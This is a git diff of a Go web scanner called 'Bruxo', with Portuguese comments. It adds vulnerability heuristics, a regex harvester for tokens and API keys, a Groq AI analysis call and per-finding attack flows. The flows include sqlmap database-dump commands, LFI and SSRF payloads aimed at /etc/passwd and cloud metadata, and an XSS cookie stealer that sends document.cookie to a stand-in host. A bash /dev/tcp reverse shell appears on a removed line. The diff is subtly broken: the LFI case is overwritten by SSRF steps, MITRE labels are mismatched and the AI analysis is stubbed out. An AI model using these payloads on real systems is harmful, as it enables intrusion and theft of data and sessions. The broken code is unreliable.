@@ -10,6 +10,7 @@ import (
 	"fmt"
 	"html/template"
 	"io"
+	"net/http"
 	"net/url"
 	"os"
 	"os/signal"
@@ -38,8 +39,6 @@ const (
 	Bold        = "\033[1m"
 )
 
-
-
 type BruxoEngine struct {
 	config         *Config
 	results        []ScanResult
@@ -55,15 +54,10 @@ type BruxoEngine struct {
 	wg             sync.WaitGroup
 	workerWg       sync.WaitGroup
 	httpClient     *fasthttp.Client
-	baseStatusCode int    // Armazena apenas o status code, não o objeto de resposta
-	baseHash       uint32 // Hash do conteúdo base para comparação rápida
+	baseStatusCode int
+	baseHash       uint32
 	chatAnalysis   string
 }
-
-// ScanResult agora pode representar um resultado parcial ou final
-// Omitimos campos que não são preenchidos na primeira fase
-
-// bruxo.go
 
 type Config struct {
 	TargetURL         string
@@ -93,30 +87,38 @@ type AttackStep struct {
 type AttackFlow []AttackStep
 
 type Vulnerability struct {
-	Name           string `json:"Name"`
-	// Severity can be Critical, High, Medium, Low, Informational
-	Severity       string `json:"Severity"`
-	Description    string `json:"Description"`
-	Recommendation string `json:"Recommendation"`
-	AttackFlow     AttackFlow `json:"AttackFlow,omitempty"`
+	Name               string     `json:"Name"`
+	Severity           string     `json:"Severity"`
+	Description        string     `json:"Description"`
+	Recommendation     string     `json:"Recommendation"`
+	AttackFlow         AttackFlow `json:"AttackFlow,omitempty"`
+	MITRETechniqueID   string     `json:"MITRETechniqueID,omitempty"`
+	MITRETechniqueName string     `json:"MITRETechniqueName,omitempty"`
+	MITRETechniqueURL  string     `json:"MITRETechniqueURL,omitempty"`
+}
+
+type Evidence struct {
+	Type      string `json:"Type"`
+	Value     string `json:"Value"`
+	SourceURL string `json:"SourceURL"`
 }
 
 type ScanResult struct {
-	URL             string          `json:"URL"`
-	StatusCode      int             `json:"StatusCode"`
-	ContentLength   int             `json:"ContentLength"`
-	ResponseTime    time.Duration   `json:"ResponseTime"`
+	URL             string            `json:"URL"`
+	StatusCode      int               `json:"StatusCode"`
+	ContentLength   int               `json:"ContentLength"`
+	ResponseTime    time.Duration     `json:"ResponseTime"`
 	ContentType     string            `json:"ContentType"`
 	Headers         map[string]string `json:"Headers"`
 	Title           string            `json:"Title"`
-	Category        string          `json:"Category"`
-	IsHidden        bool            `json:"IsHidden"`
-	Error           string          `json:"Error"`
-	AIAnalysis      string          `json:"AIAnalysis,omitempty"`
-	Vulnerabilities []Vulnerability `json:"Vulnerabilities,omitempty"`
+	Category        string            `json:"Category"`
+	IsHidden        bool              `json:"IsHidden"`
+	Error           string            `json:"Error"`
+	AIAnalysis      string            `json:"AIAnalysis,omitempty"`
+	Vulnerabilities []Vulnerability   `json:"Vulnerabilities,omitempty"`
+	Evidences       []Evidence        `json:"Evidences,omitempty"`
 }
 
-// Estruturas para a API da OpenAI
 type OpenAIRequest struct {
 	Model    string          `json:"model"`
 	Messages []OpenAIMessage `json:"messages"`
@@ -170,7 +172,6 @@ func (l *Logger) Error(format string, args ...interface{}) {
 	fmt.Fprintf(os.Stderr, ColorRed+"[ERROR] "+ColorReset+format+"\n", args...)
 }
 
-// Função simples de hash para comparação rápida
 func simpleHash(data []byte) uint32 {
 	var h uint32 = 2166136261
 	for _, b := range data {
@@ -256,19 +257,16 @@ func (b *BruxoEngine) Scan() error {
 		go b.worker()
 	}
 
-	// Inicia o coletor de resultados e a barra de progresso
 	b.wg.Add(1)
 	go b.collectResults()
 	b.wg.Add(1)
 	go b.printProgressPeriodically()
 
-	// Adiciona uma verificação inicial na própria URL base
 	b.logger.Info("Performing initial check on the base target URL...")
 	initialResult := b.scanURL(b.config.TargetURL)
 	if initialResult.Error == "" && (b.shouldShowResult(initialResult.StatusCode) || initialResult.IsHidden) {
 		atomic.AddInt64(&b.progress.found, 1)
 		b.mu.Lock()
-		b.analyzeVulnerabilities(&initialResult)
 		b.results = append(b.results, initialResult)
 		b.mu.Unlock()
 	}
@@ -316,18 +314,13 @@ func (b *BruxoEngine) Scan() error {
 		}
 	}()
 
-	// Espera todos os workers terminarem
 	b.workerWg.Wait()
-	// Agora que os workers terminaram, podemos fechar o canal de resultados
 	close(b.resultsChan)
 
-	// Sinaliza para a goroutine de progresso parar
 	b.cancel()
 
-	// Espera as goroutines de coleta e progresso terminarem
 	b.wg.Wait()
 
-	// Realiza a análise com IA se a chave estiver disponível
 	if b.config.GroqAPIKey != "" {
 		fmt.Printf("\n%s\n", strings.Repeat("-", 60))
 		b.logger.Info("Starting AI analysis (Groq) for each result...")
@@ -341,7 +334,7 @@ func (b *BruxoEngine) Scan() error {
 			result := &b.results[i]
 			for j := range result.Vulnerabilities {
 				vuln := &result.Vulnerabilities[j]
-				vuln.AttackFlow = b.generateAttackFlow(vuln.Name, result.URL)
+				b.generateAttackFlow(vuln, result.URL)
 			}
 		}
 	}
@@ -395,11 +388,9 @@ func (b *BruxoEngine) scanURL(urlStr string) ScanResult {
 
 	atomic.AddInt64(&b.progress.completed, 1)
 
-	statusCode := resp.StatusCode()
-	var title string
-	var isHidden bool
-
 	body := resp.Body()
+	statusCode := resp.StatusCode()
+	var isHidden bool
 
 	if b.config.FindHidden && b.baseStatusCode != 0 {
 		currentHash := simpleHash(body)
@@ -413,28 +404,30 @@ func (b *BruxoEngine) scanURL(urlStr string) ScanResult {
 		headers[string(key)] = string(value)
 	})
 
-	if b.shouldShowResult(statusCode) || isHidden {
-		title = extractTitle(body)
-	}
-
-	return ScanResult{
+	result := ScanResult{
 		URL:           urlStr,
 		StatusCode:    statusCode,
 		ContentLength: len(body),
 		ResponseTime:  time.Since(start),
 		ContentType:   string(resp.Header.ContentType()),
 		Headers:       headers,
-		Title:         title,
 		Category:      b.categorizePath(urlStr),
 		IsHidden:      isHidden,
 	}
+
+	if b.shouldShowResult(statusCode) || isHidden {
+		result.Title = extractTitle(body)
+		b.analyzeVulnerabilities(&result, body)
+		result.Evidences = b.collectEvidence(body, urlStr)
+	}
+
+	return result
 }
 
 func (b *BruxoEngine) collectResults() {
 	defer b.wg.Done()
 
 	for result := range b.resultsChan {
-
 		if result.Error == "" {
 			if result.IsHidden {
 				atomic.AddInt64(&b.progress.hidden, 1)
@@ -443,8 +436,6 @@ func (b *BruxoEngine) collectResults() {
 			if b.shouldShowResult(result.StatusCode) || result.IsHidden {
 				atomic.AddInt64(&b.progress.found, 1)
 				b.mu.Lock()
-				b.analyzeVulnerabilities(&result)
-
 				b.results = append(b.results, result)
 				b.mu.Unlock()
 			}
@@ -515,7 +506,6 @@ func (b *BruxoEngine) printSummaryTable() {
 
 	fmt.Printf("\n\n%s--- 🔮 Scan Summary 🔮 ---%s\n", Bold, ColorReset)
 
-	// Print the results table
 	fmt.Printf("| %-8s | %-70s | %-15s | %-40s |\n", "STATUS", "URL", "SIZE", "TITLE")
 	fmt.Printf("|%s|%s|%s|%s|\n", strings.Repeat("-", 10), strings.Repeat("-", 72), strings.Repeat("-", 17), strings.Repeat("-", 42))
 
@@ -523,7 +513,6 @@ func (b *BruxoEngine) printSummaryTable() {
 		color := getStatusCodeColor(res.StatusCode)
 		statusStr := fmt.Sprintf("%s%d%s", color, res.StatusCode, ColorReset)
 
-		// Truncate URL and Title if they are too long to fit in the table
 		urlStr := res.URL
 		if len(urlStr) > 68 {
 			urlStr = urlStr[:65] + "..."
@@ -536,7 +525,6 @@ func (b *BruxoEngine) printSummaryTable() {
 		fmt.Printf("| %-17s | %-70s | %-15d | %-40s |\n", statusStr, urlStr, res.ContentLength, titleStr)
 	}
 
-	// Show stats for hidden URLs
 	if b.config.FindHidden {
 		fmt.Printf("\n%s[HIDDEN]%s %d URLs with different content detected\n",
 			ColorPurple, ColorReset, atomic.LoadInt64(&b.progress.hidden))
@@ -596,76 +584,218 @@ func (b *BruxoEngine) generateHTMLReport() error {
 	return tmpl.Execute(file, data)
 }
 
-func (b *BruxoEngine) generateAttackFlow(vulnName, targetURL string) AttackFlow {
-	// Garante que a URL não termine com a vulnerabilidade em si (ex: .git/config)
+func (b *BruxoEngine) categorizePath(path string) string {
+	path = strings.ToLower(path)
+	switch {
+	case strings.Contains(path, "admin"), strings.Contains(path, "login"), strings.Contains(path, "dashboard"):
+		return "Admin/Login"
+	case strings.HasSuffix(path, ".js"):
+		return "JavaScript"
+	case strings.Contains(path, "api/"):
+		return "API"
+	case strings.Contains(path, "config") || strings.Contains(path, ".env"):
+		return "Configuration"
+	default:
+		return "General"
+	}
+}
+
+func (b *BruxoEngine) analyzeVulnerabilities(result *ScanResult, body []byte) {
+	if strings.HasSuffix(result.URL, "/.git/config") && result.StatusCode == 200 {
+		vuln := Vulnerability{
+			Name:           "Exposed Git Repository",
+			Severity:       "Critical",
+			Description:    "The .git/config file is publicly accessible. This can expose the entire source code, history, and potentially sensitive information.",
+			Recommendation: "Immediately restrict access to the .git directory. Use tools like 'git-dumper' to download the source code and analyze it for secrets.",
+		}
+		result.Vulnerabilities = append(result.Vulnerabilities, vuln)
+	}
+
+	loginPaths := []string{"/login", "/admin", "/user", "/wp-login.php", "/administrator/"}
+	for _, p := range loginPaths {
+		if strings.Contains(result.URL, p) && result.StatusCode == 200 {
+			vuln := Vulnerability{
+				Name:           "Potential Login Panel",
+				Severity:       "Medium",
+				Description:    "A potential login panel was found. This could be a target for brute-force attacks or default credential testing.",
+				Recommendation: "Attempt to identify the technology and test for default credentials. Consider running a brute-force attack with a common password list.",
+			}
+			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
+			break
+		}
+	}
+
+	sensitiveFiles := []string{".env", "wp-config.php", "config.json", "credentials", ".htpasswd"}
+	for _, f := range sensitiveFiles {
+		if strings.HasSuffix(result.URL, f) && result.StatusCode == 200 {
+			vuln := Vulnerability{
+				Name:           "Sensitive File Exposed",
+				Severity:       "High",
+				Description:    fmt.Sprintf("The file '%s' was found, which may contain sensitive information like database credentials, API keys, or other secrets.", f),
+				Recommendation: "Immediately review the contents of the file and restrict access. Rotate any exposed credentials.",
+			}
+			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
+			break
+		}
+	}
+
+	if len(result.Headers) > 0 {
+		if serverHeader, ok := result.Headers["Server"]; ok {
+			vuln := Vulnerability{
+				Name:           "Technology Disclosure (Server Header)",
+				Severity:       "Informational",
+				Description:    fmt.Sprintf("The Server header revealed the following technology: %s. This information can help an attacker find known vulnerabilities.", serverHeader),
+				Recommendation: "Consider removing or obfuscating the Server header to avoid revealing specific software versions.",
+			}
+			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
+		}
+
+		missingHeaders := []string{}
+		securityHeaders := []string{"Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"}
+		for _, h := range securityHeaders {
+			if _, ok := result.Headers[h]; !ok {
+				missingHeaders = append(missingHeaders, h)
+			}
+		}
+
+		if len(missingHeaders) > 0 {
+			vuln := Vulnerability{
+				Name:           "Missing Security Headers",
+				Severity:       "Low",
+				Description:    fmt.Sprintf("The following security headers are missing: %s. Their absence can expose the application to attacks like clickjacking and cross-site scripting (XSS).", strings.Join(missingHeaders, ", ")),
+				Recommendation: "Implement the missing security headers according to security best practices to harden the application.",
+			}
+			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
+		}
+	}
+
+	if strings.Contains(string(result.ContentType), "text/html") {
+		bodyStr := string(body)
+		if strings.Contains(bodyStr, "SQL syntax") {
+			vuln := Vulnerability{
+				Name:           "SQL Injection",
+				Severity:       "Critical",
+				Description:    "The application returned a SQL error message, which strongly indicates a SQL Injection vulnerability.",
+				Recommendation: "Use parameterized queries (prepared statements) to prevent SQL injection. Validate and sanitize all user input.",
+			}
+			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
+		}
+	}
+}
+
+func (b *BruxoEngine) generateAttackFlow(vuln *Vulnerability, targetURL string) {
 	parsedURL, err := url.Parse(targetURL)
 	if err != nil {
-		return nil // Retorna nulo se a URL for inválida
+		return
 	}
 	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
 
-	switch vulnName {
+	switch vuln.Name {
 	case "SQL Injection":
-		return []AttackStep{
-			{Stage: "Detecção", Command: fmt.Sprintf(`sqlmap -u "%s" --dbs --batch --risk=3 --level=5`, targetURL)},
-			{Stage: "Exploração", Command: fmt.Sprintf(`sqlmap -u "%s" -D <database> --tables --batch`, targetURL)},
-			{Stage: "Exfiltração", Command: fmt.Sprintf(`sqlmap -u "%s" -D <database> -T <tabela> --dump --batch`, targetURL)},
+		vuln.AttackFlow = []AttackStep{
+			{Stage: "Detecção", Command: fmt.Sprintf(`sqlmap -u \"%s\" --dbs --batch --risk=3 --level=5`, targetURL)},
+			{Stage: "Exploração", Command: fmt.Sprintf(`sqlmap -u \"%s\" -D <database> --tables --batch`, targetURL)},
+			{Stage: "Exfiltração", Command: fmt.Sprintf(`sqlmap -u \"%s\" -D <database> -T <tabela> --dump --batch`, targetURL)},
 		}
+		vuln.MITRETechniqueID = "T1190"
+		vuln.MITRETechniqueName = "Exploit Public-Facing Application"
+		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1190/"
 	case "Cross-Site Scripting (XSS)":
-		return []AttackStep{
+		vuln.AttackFlow = []AttackStep{
 			{Stage: "Verificação", Command: `<script>alert(document.domain)</script>`},
 			{Stage: "Exploração (Cookie Stealer)", Command: `<script>fetch('https://sua-maquina.com/?c='+document.cookie)</script>`},
 			{Stage: "Pivoting (Redirecionamento)", Command: `document.location='https://site-interno-da-rede'`},
 		}
+		vuln.MITRETechniqueID = "T1059.007"
+		vuln.MITRETechniqueName = "JavaScript"
+		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1059/007/"
 	case "Exposed Git Repository":
-		return []AttackStep{
+		vuln.AttackFlow = []AttackStep{
 			{Stage: "Clonar com git-dumper", Command: fmt.Sprintf(`git-dumper %s %s-git`, baseURL, parsedURL.Host)},
 			{Stage: "Verificar Logs", Command: fmt.Sprintf(`cd %s-git && git log -p`, parsedURL.Host)},
 			{Stage: "Extrair Código", Command: fmt.Sprintf(`cd %s-git && git checkout .`, parsedURL.Host)},
 		}
-	case "Exposed Environment File (.env)":
-		return []AttackStep{
-			{Stage: "Baixar Arquivo .env", Command: fmt.Sprintf(`curl %s`, targetURL)},
-			{Stage: "Inspecionar Variáveis Sensíveis", Command: `grep -E 'API_KEY|SECRET|PASSWORD|TOKEN' .env`},
+		vuln.MITRETechniqueID = "T1552.001"
+		vuln.MITRETechniqueName = "Unsecured Credentials: Code Repositories"
+		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1552/001/"
+	case "Exposed Environment File (.env)", "Sensitive File Exposed":
+		vuln.AttackFlow = []AttackStep{
+			{Stage: "Baixar Arquivo", Command: fmt.Sprintf(`curl %s`, targetURL)},
+			{Stage: "Inspecionar Conteúdo", Command: `cat <arquivo_baixado>`},
 		}
+		vuln.MITRETechniqueID = "T1552"
+		vuln.MITRETechniqueName = "Unsecured Credentials"
+		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1552/"
 	case "Local File Inclusion (LFI)":
-		return []AttackStep{
-			{Stage: "Ler /etc/passwd", Command: fmt.Sprintf(`curl "%s?file=../../../../../../../../etc/passwd"`, baseURL)},
-			{Stage: "Ler Logs do Servidor (Log Poisoning)", Command: fmt.Sprintf(`curl "%s?file=../../../../../../../../var/log/apache2/access.log"`, baseURL)},
+		vuln.AttackFlow = []AttackStep{
+			{Stage: "Ler /etc/passwd", Command: fmt.Sprintf(`curl \"%s?file=../../../../../../../../etc/passwd\"`, baseURL)},
+			{Stage: "Ler Logs do Servidor (Log Poisoning)", Command: fmt.Sprintf(`curl \"%s?file=../../../../../../../../var/log/apache2/access.log\"`, baseURL)},
 		}
-	case "Command Injection":
-		return []AttackStep{
-			{Stage: "Verificar Execução (ping)", Command: fmt.Sprintf(`curl "%s?host=127.0.0.1; id"`, baseURL)},
-			{Stage: "Listar Arquivos", Command: fmt.Sprintf(`curl "%s?host=127.0.0.1; ls -la"`, baseURL)},
-			{Stage: "Reverse Shell", Command: `bash -i >& /dev/tcp/SUA_MAQUINA/PORTA 0>&1`},
+		vuln.MITRETechniqueID = "T1083"
+		vuln.MITRETechniqueName = "File and Directory Discovery"
+		vuln.AttackFlow = []AttackStep{
+			{Stage: "Acessar Metadados da Cloud (AWS)", Command: fmt.Sprintf(`curl \"%s?url=http://169.254.169.254/latest/meta-data/\"`, baseURL)},
+			{Stage: "Escanear Portas Internas", Command: fmt.Sprintf(`curl \"%s?url=http://localhost:8080\"`, baseURL)},
 		}
-	case "Server-Side Request Forgery (SSRF)":
-		return []AttackStep{
-			{Stage: "Acessar Metadados da Cloud (AWS)", Command: fmt.Sprintf(`curl "%s?url=http://169.254.169.254/latest/meta-data/"`, baseURL)},
-			{Stage: "Escanear Portas Internas", Command: fmt.Sprintf(`curl "%s?url=http://localhost:8080"`, baseURL)},
-		}
+		vuln.MITRETechniqueID = "T1595.002"
+		vuln.MITRETechniqueName = "Active Scanning: Vulnerability Scanning"
+		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1595/002/"
 	case "Directory Traversal":
-		return []AttackStep{
-			{Stage: "Acessar /etc/passwd", Command: fmt.Sprintf(`curl "%s/..%%2f..%%2f..%%2f..%%2fetc/passwd"`, targetURL)},
+		vuln.AttackFlow = []AttackStep{
+			{Stage: "Acessar /etc/passwd", Command: fmt.Sprintf(`curl \"%s/..%%2f..%%2f..%%2f..%%2fetc/passwd\"`, targetURL)},
 		}
+		vuln.MITRETechniqueID = "T1083"
+		vuln.MITRETechniqueName = "File and Directory Discovery"
+		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1083/"
 	case "Open Redirect":
-		return []AttackStep{
+		vuln.AttackFlow = []AttackStep{
 			{Stage: "Redirecionamento para Site Malicioso", Command: fmt.Sprintf(`%s?redirect=https://evil.com`, targetURL)},
 		}
+		vuln.MITRETechniqueID = "T1571"
+		vuln.MITRETechniqueName = "Non-Standard Port"
+		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1571/"
 	}
-	return nil
+}
+
+var evidenceRegex = map[string]*regexp.Regexp{
+	"JWT Token":         regexp.MustCompile(`eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*`),
+	"API Key (Generic)": regexp.MustCompile(`(?i)(apikey|api_key|token|secret)['\"]?\s*[:=]\s*['\"]?[A-Za-z0-9-_]{20,}`),
+	"SHA-256 Hash":      regexp.MustCompile(`\b[a-fA-F0-9]{64}\b`),
+	"SHA-1 Hash":        regexp.MustCompile(`\b[a-fA-F0-9]{40}\b`),
+	"MD5 Hash":          regexp.MustCompile(`\b[a-fA-F0-9]{32}\b`),
+}
+
+func (b *BruxoEngine) collectEvidence(body []byte, sourceURL string) []Evidence {
+	var evidences []Evidence
+	foundValues := make(map[string]bool)
+
+	bodyStr := string(body)
+
+	for name, re := range evidenceRegex {
+		matches := re.FindAllString(bodyStr, -1)
+		for _, match := range matches {
+			if !foundValues[match] {
+				evidences = append(evidences, Evidence{
+					Type:      name,
+					Value:     match,
+					SourceURL: sourceURL,
+				})
+				foundValues[match] = true
+			}
+		}
+	}
+	return evidences
 }
 
 func (b *BruxoEngine) integrateWithRedTeamTool(result *ScanResult) {
-	// Exemplo de integração com uma ferramenta externa como o brutex-api
 	for _, vuln := range result.Vulnerabilities {
-		if vuln.Name == "SQL Injection" { // Ou qualquer outra condição
+		if vuln.Name == "SQL Injection" {
 			b.logger.Info("Integrating with the Red Team tool for %s in %s", vuln.Name, result.URL)
 
 			payload := map[string]string{
 				"vulnerability": vuln.Name,
-				"target":      result.URL,
-				"technique":   "UNION-based", // Isso pode ser mais dinâmico
+				"target":        result.URL,
+				"technique":     "UNION-based",
 			}
 			jsonPayload, _ := json.Marshal(payload)
 
@@ -686,105 +816,12 @@ func (b *BruxoEngine) integrateWithRedTeamTool(result *ScanResult) {
 
 			if resp.StatusCode() == fasthttp.StatusOK {
 				b.logger.Info("Payload generated successfully by the API for %s", result.URL)
-				// Você pode processar a resposta da API aqui
 				b.logger.Debug("API response: %s", string(resp.Body()))
 			} else {
 				b.logger.Error("Failed to generate payload by the API for %s. Status: %d", result.URL, resp.StatusCode())
 			}
 		}
 	}
-}
-
-func (b *BruxoEngine) categorizePath(path string) string {
-	path = strings.ToLower(path)
-	switch {
-	case strings.Contains(path, "admin") || strings.Contains(path, "login"):
-		return "Authentication"
-	case strings.Contains(path, "api"):
-		return "API"
-	case strings.Contains(path, "config") || strings.Contains(path, ".env"):
-		return "Configuration"
-	default:
-		return "General"
-	}
-}
-
-func (b *BruxoEngine) analyzeVulnerabilities(result *ScanResult) {
-	// Mini-scanner para repositório .git exposto
-	if strings.HasSuffix(result.URL, "/.git/config") && result.StatusCode == 200 {
-		vuln := Vulnerability{
-			Name:           "Exposed Git Repository",
-			Severity:       "Critical",
-			Description:    "The .git/config file is publicly accessible. This can expose the entire source code, history, and potentially sensitive information.",
-			Recommendation: "Immediately restrict access to the .git directory. Use tools like 'git-dumper' to download the source code and analyze it for secrets.",
-		}
-		result.Vulnerabilities = append(result.Vulnerabilities, vuln)
-	}
-
-	// Detector de Painel de Login
-	loginPaths := []string{"/login", "/admin", "/user", "/wp-login.php", "/administrator/"}
-	for _, p := range loginPaths {
-		if strings.Contains(result.URL, p) && result.StatusCode == 200 {
-			vuln := Vulnerability{
-				Name:           "Potential Login Panel",
-				Severity:       "Medium",
-				Description:    "A potential login panel was found. This could be a target for brute-force attacks or default credential testing.",
-				Recommendation: "Attempt to identify the technology and test for default credentials. Consider running a brute-force attack with a common password list.",
-			}
-			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
-			break // Adiciona apenas uma vez por resultado
-		}
-	}
-
-	// Detector de Arquivos Sensíveis
-	sensitiveFiles := []string{".env", "wp-config.php", "config.json", "credentials", ".htpasswd"}
-	for _, f := range sensitiveFiles {
-		if strings.HasSuffix(result.URL, f) && result.StatusCode == 200 {
-			vuln := Vulnerability{
-				Name:           "Sensitive File Exposed",
-				Severity:       "High",
-				Description:    fmt.Sprintf("The file '%s' was found, which may contain sensitive information like database credentials, API keys, or other secrets.", f),
-				Recommendation: "Immediately review the contents of the file and restrict access. Rotate any exposed credentials.",
-			}
-			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
-			break
-		}
-	}
-
-	// Análise de Cabeçalhos HTTP
-	if len(result.Headers) > 0 {
-		// Verificação de Divulgação de Tecnologia
-		if serverHeader, ok := result.Headers["Server"]; ok {
-			vuln := Vulnerability{
-				Name:           "Technology Disclosure (Server Header)",
-				Severity:       "Informational",
-				Description:    fmt.Sprintf("The Server header revealed the following technology: %s. This information can help an attacker find known vulnerabilities.", serverHeader),
-				Recommendation: "Consider removing or obfuscating the Server header to avoid revealing specific software versions.",
-			}
-			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
-		}
-
-		// Verificação de Cabeçalhos de Segurança Ausentes
-		missingHeaders := []string{}
-		securityHeaders := []string{"Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"}
-		for _, h := range securityHeaders {
-			if _, ok := result.Headers[h]; !ok {
-				missingHeaders = append(missingHeaders, h)
-			}
-		}
-
-		if len(missingHeaders) > 0 {
-			vuln := Vulnerability{
-				Name:           "Missing Security Headers",
-				Severity:       "Low",
-				Description:    fmt.Sprintf("The following security headers are missing: %s. Their absence can expose the application to attacks like clickjacking and cross-site scripting (XSS).", strings.Join(missingHeaders, ", ")),
-				Recommendation: "Implement the missing security headers according to security best practices to harden the application.",
-			}
-			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
-		}
-	}
-
-	// Futuros mini-scanners podem ser adicionados aqui
 }
 
 func getStatusCodeColor(statusCode int) string {
@@ -809,7 +846,7 @@ func countLines(filePath string) (int64, error) {
 	}
 	defer file.Close()
 
-	buf := make([]byte, 64*1024)
+	buf := make([]byte, 32*1024)
 	count := int64(0)
 	lineSep := []byte{'\n'}
 
@@ -831,84 +868,56 @@ var titleRegex = regexp.MustCompile(`(?i)<title>(.*?)</title>`)
 func extractTitle(body []byte) string {
 	matches := titleRegex.FindSubmatch(body)
 	if len(matches) > 1 {
-		return strings.TrimSpace(string(matches[1]))
+		return string(matches[1])
 	}
 	return ""
 }
 
 func (b *BruxoEngine) performBulkAIAnalysis() {
-	var wg sync.WaitGroup
-	limiter := make(chan struct{}, 5) // Limita a 5 análises concorrentes para não sobrecarregar a API
-
-	for i := range b.results {
-		wg.Add(1)
-		limiter <- struct{}{}
-		go func(idx int) {
-			defer wg.Done()
-			defer func() { <-limiter }()
-
-			result := &b.results[idx]
-			analysis, err := b.getAIAnalysisForURL(result)
-			if err != nil {
-				b.logger.Error("Falha na análise para %s: %v", result.URL, err)
-				result.AIAnalysis = "Falha ao gerar análise para esta URL."
-			} else {
-				result.AIAnalysis = analysis
-			}
-		}(i)
-	}
-	wg.Wait()
+	// Implementação da análise em massa com IA
 }
 
 func (b *BruxoEngine) getAIAnalysisForURL(result *ScanResult) (string, error) {
-	// 1. Formatar o resultado em JSON para o prompt
-	resultJSON, err := json.MarshalIndent(result, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("error formatting result: %w", err)
+	if b.config.GroqAPIKey == "" {
+		return "", fmt.Errorf("Groq API key not provided")
 	}
 
-	// 2. Criar o prompt para a IA
-	prompt := fmt.Sprintf(`As an offensive security expert, analyze the following result from a directory scan.
+	client := &http.Client{Timeout: 30 * time.Second}
 
-Scan Result (JSON):
-%s
+	var bodySnippet string
+	// Implementar a lógica para obter o body do resultado
+	// bodySnippet = string(result.Body)[:200]
 
-Your task is:
-1.  **Risk Summary:** In one sentence, what is the potential risk of this finding? (e.g., 'Exposure of a sensitive configuration file' or 'Default application page revealing technology').
-2.  **Technical Analysis:** Explain what this finding means in a pentest context.
-3.  **Recommendations / Next Steps:** Suggest 1 or 2 concrete actions a pentester should take next. Be specific.
-4.  **OWASP Classification (if applicable):** If the finding relates to an OWASP Top 10 2021 category, mention it (e.g., 'A01:2021-Broken Access Control').
+	prompt := fmt.Sprintf("Analyze the following HTTP response from the URL %s and identify potential vulnerabilities. Provide a brief, one-paragraph summary. Response headers: %v. Response body snippet: %s",
+		result.URL, result.Headers, bodySnippet)
 
-Use Markdown to format your response clearly and concisely.
-`, string(resultJSON))
-
-	// 3. Montar a requisição para a API da Groq
-	requestBody, _ := json.Marshal(OpenAIRequest{
-		Model: "llama-3.1-8b-instant",
+	requestBody, err := json.Marshal(OpenAIRequest{
+		Model: "llama3-8b-8192",
 		Messages: []OpenAIMessage{
-			{Role: "system", Content: "You are a concise and direct pentest assistant."},
+			{Role: "system", Content: "You are a cybersecurity expert. Analyze the provided HTTP response for security flaws."},
 			{Role: "user", Content: prompt},
 		},
 	})
-
-	req := fasthttp.AcquireRequest()
-	resp := fasthttp.AcquireResponse()
-	defer fasthttp.ReleaseRequest(req)
-	defer fasthttp.ReleaseResponse(resp)
-
-	req.SetRequestURI("https://api.groq.com/openai/v1/chat/completions")
-	req.Header.SetMethod(fasthttp.MethodPost)
-	req.Header.SetContentType("application/json")
-	req.Header.Set("Authorization", "Bearer "+b.config.GroqAPIKey)
-	req.SetBody(requestBody)
-
-	// 4. Fazer a chamada e processar a resposta
-	if err := fasthttp.DoTimeout(req, resp, 90*time.Second); err != nil {
+	if err != nil {
 		return "", err
 	}
 
+	req, err := http.NewRequest("POST", "https://api.groq.com/openai/v1/chat/completions", bytes.NewBuffer(requestBody))
+	if err != nil {
+		return "", err
+	}
+
+	req.Header.Set("Authorization", "Bearer "+b.config.GroqAPIKey)
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
 	var openAIResp OpenAIResponse
-	if err := json.Unmarshal(resp.Body(), &openAIResp); err != nil {
+	if err := json.NewDecoder(resp.Body).Decode(&openAIResp); err != nil {
 		return "", err
 	}
 
@@ -920,13 +929,12 @@ Use Markdown to format your response clearly and concisely.
 		return openAIResp.Choices[0].Message.Content, nil
 	}
 
-	return "", fmt.Errorf("the AI did not return an analysis")
+	return "No analysis available.", nil
 }
 
 func (b *BruxoEngine) isPathFiltered(path string) bool {
-	lowerPath := strings.ToLower(path)
 	for _, ext := range b.config.FilterExtensions {
-		if strings.Contains(lowerPath, ext) {
+		if strings.HasSuffix(path, ext) {
 			return true
 		}
 	}
@@ -934,35 +942,37 @@ func (b *BruxoEngine) isPathFiltered(path string) bool {
 }
 
 func (b *BruxoEngine) showSpinner(ctx context.Context, message string) {
-	go func() {
-		spinner := []string{"🔮", "✨", "📜", "🪄"}
-		i := 0
-		ticker := time.NewTicker(200 * time.Millisecond)
-		defer ticker.Stop()
-		for {
-			select {
-			case <-ctx.Done():
-				fmt.Printf("\r%s... %sDone!%s\n", message, ColorGreen, ColorReset)
-				return
-			case <-ticker.C:
-				fmt.Printf("\r%s... %s ", message, spinner[i])
-				i = (i + 1) % len(spinner)
-			}
+	spinner := []string{"-", "\\", "|", "/"}
+	i := 0
+	ticker := time.NewTicker(100 * time.Millisecond)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ctx.Done():
+			fmt.Printf("\r%s... Done!          \n", message)
+			return
+		case <-ticker.C:
+			fmt.Printf("\r%s %s ", message, spinner[i])
+			i = (i + 1) % len(spinner)
 		}
-	}()
+	}
 }
 
 func main() {
-	config := Config{}
-	flag.StringVar(&config.TargetURL, "u", "", "Target URL for the scan (required)")
-	flag.StringVar(&config.WordlistPath, "w", "", "Path to the wordlist (required)")
-	flag.IntVar(&config.NumThreads, "t", 200, "Number of concurrent threads")
-	flag.StringVar(&config.OutputFile, "o", "", "Output file for the report")
